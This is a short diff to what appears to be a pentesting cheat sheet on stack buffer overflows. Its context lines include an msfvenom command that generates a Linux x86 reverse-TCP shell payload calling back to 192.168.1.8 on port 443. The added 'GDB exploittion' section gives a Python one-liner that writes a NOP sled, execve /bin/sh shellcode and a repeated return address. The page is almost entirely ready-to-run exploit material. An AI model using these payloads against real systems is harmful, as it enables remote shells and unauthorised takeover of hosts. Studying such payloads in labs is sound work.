@@ -253,3 +253,10 @@ dmesg | grep NX
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.8 LPORT=443 -b "\x00\x20" -f py -v shellcode
 ```
 
+GDB exploittion
+
+{% code overflow="wrap" %}
+```bash
+python -c "import sys; sys.stdout.buffer.write(b'\x90' * 89 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + b'\x20\xd2\xff\xff' * 4)"
+```
+{% endcode %}
